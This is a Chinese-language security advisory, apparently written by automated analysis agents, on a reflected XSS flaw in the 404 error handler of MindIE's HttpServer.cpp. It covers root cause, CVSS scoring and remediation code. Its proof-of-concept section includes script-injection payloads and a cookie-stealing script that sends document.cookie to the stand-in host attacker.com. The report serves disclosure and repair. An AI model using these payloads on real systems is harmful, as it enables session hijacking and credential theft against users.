# VULN-DF-CPP-001: ResourceNotFound错误页面用户输入未转义致XSS攻击

## 1. 漏洞概述

| 属性 | 详情 |
|------|------|
| **漏洞ID** | VULN-DF-CPP-001 |
| **漏洞类型** | Cross-Site Scripting (XSS) |
| **CWE编号** | CWE-79: Improper Neutralization of Input During Web Page Generation |
| **严重程度** | High (验证后升级) |
| **置信度** | 85/100 |
| **影响文件** | mindie_motor/src/common/http_server/HttpServer.cpp |
| **漏洞位置** | ResourceNotFound() 函数，第34行 |
| **发现Agent** | dataflow-scanner |

---

## 2. 漏洞详情分析

### 2.1 漏洞代码片段

```cpp
// HttpServer.cpp:27-40
static Http::message_generator ResourceNotFound(const Http::request<Http::string_body> &req, 
    const std::string &ip, Beast::string_view target)
{
    LOG_M("[Handle] Handle request, IP %s, method %s, target %s, code %d.",
        ip.c_str(), std::string(req.method_string()).c_str(),
        std::string(req.target()).c_str(), static_cast<int>(Http::status::not_found));
    Http::response<Http::string_body> response{Http::status::not_found, req.version()};
    response.body() = "Cannot find the resource " + std::string(target);  // 第34行 - XSS漏洞点
    std::string contentType = "text/html";  // 第35行 - 关键：Content-Type设置为HTML
    response.set(Http::field::content_type, contentType);
    response.keep_alive(req.keep_alive());
    response.prepare_payload();
    return response;
}
```

### 2.2 数据流追踪

| 节点 | 文件:行号 | 说明 |
|------|-----------|------|
| **SOURCE** | HttpServer.cpp:115 | `HandleRequest()` 接收 HTTP 请求，`req.target()` 为用户可控的网络输入 |
| **PARTIAL CHECK** | HttpServer.cpp:122 | 路径遍历检查：检查 `..` 和非 `/` 开头的路径，但**未进行HTML/XSS转义** |
| **SINK** | HttpServer.cpp:34 | `response.body() = "Cannot find the resource " + std::string(target)` - 直接拼接到响应体 |

### 2.3 漏洞根因分析

1. **用户输入未转义**：HTTP请求的 `target` (URL路径) 直接通过 `std::string(target)` 拼接到响应体，未进行任何HTML实体编码或转义处理。

2. **Content-Type 为 text/html**：响应的 Content-Type 设置为 `"text/html"`（第35-36行），这意味着浏览器会将响应内容解析为HTML并执行其中的JavaScript脚本。

3. **路径遍历检查不等于XSS防护**：第122行的检查 `req.target().find("..") != Beast::string_view::npos` 仅防止路径遍历攻击，对XSS攻击完全无效。攻击者可以注入 `<script>` 标签而不使用 `..` 字符。

---

## 3. 攻击向量分析

### 3.1 攻击向量类型

**反射型 XSS (Reflected XSS)**

- 恶意脚本通过URL路径参数即时注入到响应中
- 不存储在服务器端，每次请求都会触发
- 攻击者需要诱导受害者点击特制URL

### 3.2 攻击入口点

| 入口 | 类型 | 信任等级 | 可达性 |
|------|------|----------|--------|
| HTTP 请求 target | network | untrusted_network | 公网接口，任何人可连接 |

### 3.3 触发条件

漏洞仅在以下条件下被触发：

1. HTTP 请求访问的路径不存在于已注册的 URL Handler 中
2. 请求通过路径遍历检查（不包含 `..` 且以 `/` 开头）
3. 最终调用 `ResourceNotFound()` 返回 404 响应

---

## 4. PoC 概念验证

### 4.1 基础 PoC (直接注入)

```http
GET /<script>alert('XSS-PoC')</script> HTTP/1.1
Host: target-server:port
Connection: close
```

**预期响应**：

```http
HTTP/1.1 404 Not Found
Content-Type: text/html
Content-Length: 45

Cannot find the resource <script>alert('XSS-PoC')</script>
```

浏览器将解析响应并执行 `alert('XSS-PoC')` JavaScript代码。

### 4.2 隐蔽 PoC (使用事件处理器)

```http
GET /<img src=x onerror=alert(document.cookie)> HTTP/1.1
Host: target-server:port
```

**优势**：绕过简单的 `<script>` 标签过滤（如果存在），利用图片加载错误触发JavaScript。

### 4.3 高级 PoC (Cookie窃取)

```http
GET /<script>
var img=new Image();
img.src="http://attacker.com/steal?c="+document.cookie;
</script> HTTP/1.1
Host: target-server:port
```

**攻击效果**：窃取受害者的会话Cookie，发送到攻击者控制的服务器。

### 4.4 URL编码版本 (适用于浏览器)

```
http://target-server:port/%3Cscript%3Ealert('XSS')%3C/script%3E
```

URL解码后为：`/<script>alert('XSS')</script>`

---

## 5. 利用前提条件

### 5.1 技术前提

| 条件 | 说明 | 验证状态 |
|------|------|----------|
| HTTP 服务运行 | MindIE HTTP Server 必须正在运行并监听端口 | ✅ 存在 Listener 类绑定端口 |
| 网络可达性 | 攻击者需要能够连接到 HTTP 服务端口 | ✅ 公网接口设计 |
| 触发404响应 | 需要请求未注册的路径以触发 ResourceNotFound | ✅ 任何未知路径都会触发 |

### 5.2 环境因素

| 因素 | 影响 | 风险等级 |
|------|------|----------|
| TLS 启用 | 如果服务使用TLS，攻击URL需要使用HTTPS | 可能降低攻击成功率 |
| 客户端证书验证 | 代码中有 `Ssl::verify_peer | Ssl::verify_fail_if_no_peer_cert` | **关键缓解因素** |
| 认证机制 | 需确认服务是否有额外认证层 | 需进一步调查 |

**关键发现**：代码第609行设置了 `Ssl::verify_peer | Ssl::verify_fail_if_no_peer_cert`，要求客户端提供有效证书。这**显著增加了攻击难度**，攻击者需要：
- 拥有有效的客户端证书
- 或找到绕过TLS验证的方法
- 或攻击者本身是合法用户

---

## 6. 攻击影响评估

### 6.1 直接影响

| 影响 | 严重程度 | 说明 |
|------|----------|------|
| Cookie窃取 | High | 窃取会话Cookie，可能导致会话劫持 |
| 凭证收集 | Medium | 通过伪造登录表单收集用户凭证 |
| 恶意操作执行 | High | 以用户身份执行操作（API调用等） |
| 信息泄露 | Medium | 窃取页面内容、用户数据 |

### 6.2 间接影响

| 影响 | 严重程度 | 说明 |
|------|----------|------|
| 恶意软件分发 | Medium | 通过XSS注入恶意iframe或下载链接 |
| 钓鱼攻击 | High | 在页面内注入钓鱼内容，用户难以辨别 |
| 浏览器漏洞利用 | Critical | 结合浏览器漏洞实现更严重攻击 |

### 6.3 CVSS v3.1 评分估算

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N
```

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector (AV) | Network | 通过网络远程攻击 |
| Attack Complexity (AC) | Low | 攻击简单，无需特殊条件 |
| Privileges Required (PR) | Low | 可能需要有效客户端证书（降低风险） |
| User Interaction (UI) | Required | 需诱导受害者点击恶意链接 |
| Scope (S) | Changed | XSS影响浏览器环境，超出原始漏洞范围 |
| Confidentiality (C) | High | 可窃取敏感信息 |
| Integrity (I) | Low | 可修改页面内容 |
| Availability (A) | None | 不直接影响服务可用性 |

**估算评分**：**7.1 (High)**

---

## 7. 修复建议

### 7.1 主要修复方案

#### 方案一：HTML实体编码（推荐）

**修改位置**：HttpServer.cpp:34

```cpp
// 当前代码（存在漏洞）
response.body() = "Cannot find the resource " + std::string(target);

// 修复代码 - 使用HTML实体编码
static std::string HtmlEscape(const std::string& input) {
    std::string output;
    for (char c : input) {
        switch (c) {
            case '&':  output += "&amp;";   break;
            case '<':  output += "&lt;";    break;
            case '>':  output += "&gt;";    break;
            case '"':  output += "&quot;";  break;
            case '\'': output += "&#39;";   break;
            default:   output += c;         break;
        }
    }
    return output;
}

// 应用转义
response.body() = "Cannot find the resource " + HtmlEscape(std::string(target));
```

**优点**：
- 简单有效，标准防御方法
- 保持原有错误信息展示功能
- 阻止所有HTML/JavaScript注入

#### 方案二：更改 Content-Type

**修改位置**：HttpServer.cpp:35-36

```cpp
// 当前代码（高风险）
std::string contentType = "text/html";

// 修复代码 - 使用纯文本类型
std::string contentType = "text/plain";
// 或
std::string contentType = "application/json";
```

**优点**：
- 一行代码即可修复
- 浏览器不会解析为HTML

**缺点**：
- 如果其他部分依赖HTML展示，可能影响用户体验
- 不推荐作为主要方案，应结合方案一

### 7.2 辅助防御措施

| 措施 | 实施方式 | 效果 |
|------|----------|------|
| Content-Security-Policy | 添加 CSP 头部：`Content-Security-Policy: default-src 'self'` | 阻止内联脚本执行 |
| X-XSS-Protection | 添加头部：`X-XSS-Protection: 1; mode=block` | 启用浏览器XSS过滤器（旧浏览器） |
| HttpOnly Cookie | 设置 Cookie 的 HttpOnly 属性 | 防止JavaScript读取Cookie |
| 输入白名单验证 | 验证 target 只包含合法字符（字母、数字、`/`、`-`、`_`） | 限制可接受的输入范围 |

### 7.3 完整修复代码示例

```cpp
static Http::message_generator ResourceNotFound(const Http::request<Http::string_body> &req, 
    const std::string &ip, Beast::string_view target)
{
    LOG_M("[Handle] Handle request, IP %s, method %s, target %s, code %d.",
        ip.c_str(), std::string(req.method_string()).c_str(),
        std::string(req.target()).c_str(), static_cast<int>(Http::status::not_found));
    
    Http::response<Http::string_body> response{Http::status::not_found, req.version()};
    
    // HTML转义函数
    std::string escaped_target;
    for (char c : target) {
        switch (c) {
            case '&':  escaped_target += "&amp;";   break;
            case '<':  escaped_target += "&lt;";    break;
            case '>':  escaped_target += "&gt;";    break;
            case '"':  escaped_target += "&quot;";  break;
            case '\'': escaped_target += "&#39;";   break;
            default:   escaped_target += c;         break;
        }
    }
    
    response.body() = "Cannot find the resource " + escaped_target;
    std::string contentType = "text/plain";  // 改为纯文本，双重保障
    response.set(Http::field::content_type, contentType);
    
    // 添加安全头部
    response.set("X-Content-Type-Options", "nosniff");
    response.set("Content-Security-Policy", "default-src 'self'");
    
    response.keep_alive(req.keep_alive());
    response.prepare_payload();
    return response;
}
```

---

## 8. 验证结论

### 8.1 漏洞判定

✅ **真实漏洞确认**

- 漏洞存在且可利用
- 符合 CWE-79 XSS 定义
- 有明确的攻击向量
- 存在有效的 PoC 构造方法

### 8.2 利用难度评估

| 难度因素 | 评级 | 说明 |
|----------|------|------|
| 基础利用 | Easy | XSS 注入技术成熟，无需专业知识 |
| 触发条件 | Easy | 任何未知路径即可触发 |
| 环境约束 | Medium | TLS客户端证书验证可能增加难度 |
| 总体评估 | **Medium** | 需考虑实际部署环境 |

### 8.3 修复优先级

| 维度 | 评级 | 说明 |
|------|------|------|
| 严重程度 | High | CVSS 7.1，可能导致会话劫持 |
| 利用难度 | Medium | 受TLS验证约束 |
| 修复成本 | Low | 简单代码修改即可修复 |
| **整体优先级** | **High** | 建议尽快修复 |

---

## 9. 附录

### 9.1 相关 CWE 参考

- **CWE-79**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **CWE-80**: Improper Neutralization of Script-Related HTML Tags in a Web Page
- **CWE-83**: Improper Neutralization of Script in Attributes in a Web Page

### 9.2 参考资料

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79 Detail: https://cwe.mitre.org/data/definitions/79.html
- PortSwigger XSS Guide: https://portswigger.net/web-security/cross-site-scripting

---

**报告生成时间**: 2026-04-17  
**分析Agent**: details-worker  
**验证状态**: ✅ 真实漏洞，已生成详细报告